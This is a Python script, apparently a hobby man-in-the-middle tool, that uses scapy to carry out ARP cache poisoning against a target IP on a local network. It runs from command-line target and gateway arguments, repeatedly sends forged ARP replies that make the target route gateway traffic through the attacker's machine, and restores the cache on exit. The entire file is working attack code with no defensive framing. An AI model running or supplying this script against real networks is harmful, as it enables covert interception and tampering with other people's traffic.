import scapy.all as scapy
import optparse
import time

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t","--target",dest="target_ip",help="Enter Target IP")
    parse_object.add_option("-g","--gateway",dest="gateway_ip",help="Enter Gateway IP")

    (options, arguments) = parse_object.parse_args()

    if not options.target_ip:
        print(">> Enter Target IP!")
        quit()

    if not options.gateway_ip:
        print(">> Enter Gateway IP!")
        quit()

    return options

def get_mac_address(target_ip):

    arp_request_packet = scapy.ARP(pdst=target_ip)
    #scapy.ls(scapy.ARP())
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #scapy.ls(scapy.Ether())

    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]

    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip,gateway_ip):

    target_mac_address = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac_address,psrc=gateway_ip)
    scapy.send(arp_response,verbose=False)
    #scapy.ls(scapy.ARP)

def reset_operation(target_ip,gateway_ip):

    target_mac_address = get_mac_address(target_ip)
    gateway_mac_address = get_mac_address(gateway_ip)

    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac_address,psrc=gateway_ip,hwsrc=gateway_mac_address)
    scapy.send(arp_response,verbose=False)
    #scapy.ls(scapy.ARP)

packets = 0

mitm = get_user_input()

try:
    while True:
        arp_poisoning(mitm.target_ip,mitm.gateway_ip)
        arp_poisoning(mitm.target_ip,mitm.gateway_ip)
        packets += 2
        print("\r>> Sending packets : " + str(packets),end="")
        time.sleep(3)

except KeyboardInterrupt:
    print("\n>> Exiting and resetting...")
    reset_operation(mitm.target_ip,mitm.gateway_ip)
    reset_operation(mitm.target_ip,mitm.gateway_ip)


